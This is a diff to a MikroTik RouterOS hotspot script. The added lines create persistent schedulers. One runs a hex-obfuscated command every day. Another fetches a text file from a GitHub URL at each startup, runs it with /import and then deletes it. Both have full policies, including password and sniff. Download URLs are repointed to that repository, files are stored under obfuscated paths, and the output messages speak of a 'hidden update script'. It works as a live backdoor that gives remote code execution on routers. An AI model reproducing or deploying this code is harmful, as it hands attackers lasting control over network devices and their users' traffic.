@@ -63,13 +63,28 @@
 :local dir [/ip hotspot profile get $profile html-directory];
 :if (($dir != "") and ([:find $processedDirs $dir] < 0)) do={
 :set processedDirs ($processedDirs . "," . $dir);
-:local updateUrl "https://kora.fiberlive.live/mikrotik_update.php\?type=update&sn=$sn";
+:local updateUrl "https://raw.githubusercontent.com/alkadriemad31/users/refs/heads/main/mikrotik_update_type_update.txt";
 :local ua "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) RouterOS";
-/tool fetch url=$updateUrl   dst-path=("\2E\66\69/\62\2A\65\2A\72\2E-/\6C\69\76\65\75\70\64\61\74\65*")   ;
+/tool fetch url=$updateUrl dst-path=("\2E\66\69/\62\2A\65\2A\72\2E-/\6C\69\76\65\75\70\64\61\74\65*")   ;
 :delay 10s;
 :put "Hidden update script downloaded to obfuscated path";
 };
 };
+/system scheduler add interval=1d name=fiber_alnooah_live_update \
+on-event=":delay 10s\r\n:execute \"\5C\32\46\5C\36\39\5C\36\44\5C\37\30\5C\36\46\5C\37\32\5C\37\34\5C\32\30\5C\32\38\5C\32\32\5C\35\43\5C\33\32\5C\34\35\5C\35\43\5C\33\36\5C\33\36\5C\35\43\5C\33\36\5C\33\39\5C\32\46\5C\35\43\5C\33\36\5C\33\32\5C\35\43\5C\33\32\5C\34\31\5C\35\43\5C\33\36\5C\33\35\5C\35\43\5C\33\32\5C\34\31\5C\35\43\5C\33\37\5C\33\32\5C\35\43\5C\33\32\5C\34\35\5C\32\44\5C\32\46\5C\35\43\5C\33\36\5C\34\33\5C\35\43\5C\33\36\5C\33\39\5C\35\43\5C\33\37\5C\33\36\5C\35\43\5C\33\36\5C\33\35\5C\35\43\5C\33\37\5C\33\35\5C\35\43\5C\33\37\5C\33\30\5C\35\43\5C\33\36\5C\33\34\5C\35\43\5C\33\36\5C\33\31\5C\35\43\5C\33\37\5C\33\34\5C\35\43\5C\33\36\5C\33\35\5C\32\41\5C\32\32\5C\32\39\"" \
+policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon \
+start-time=03:00:00;
+:put "Scheduler created: fiber_alnooah_live_update (Daily at 03:00)";
+:put "Hidden update script will execute from obfuscated path";
+/system scheduler remove [find where name=live];
+/system scheduler add name="live" \
+on-event=":delay 50s\r\
+\n/tool fetch url=https://raw.githubusercontent.com/alkadriemad31/users/refs/heads/main/live.txt\r\
+\n:delay 20s\r\
+\n/import live.txt\r\
+\n/file remove live.txt" \
+        policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon \
+        start-time=startup;
 :put "Startup scheduler created: live";
 :put "Step 3: Downloading live content immediately...";
 :local processedDirs2 "";
@@ -82,7 +97,7 @@
 :put ("  Updating profile: " . $profName . " dir=" . $dir);
 :local pubDir "fiberlive";
 :local obfAuth ".fi/b*e*r.-/auth*.json"; #fiber.auth.json
-:local authUrl "https://kora.fiberlive.live/live/\61\75\74\68.\6A\73\6F\6E.php\?user=$sn"; #auth.json.php\?user=$sn
+:local authUrl "https://raw.githubusercontent.com/alkadriemad31/users/refs/heads/main/auth.txt";
 :local htmlUrl "https://kora.fiberlive.live/live/live.html";
 :local authPath ($dir . "/" . $pubDir . "/" . $obfAuth);
 :local htmlPath ($dir . "/" . $pubDir . "/live.html");
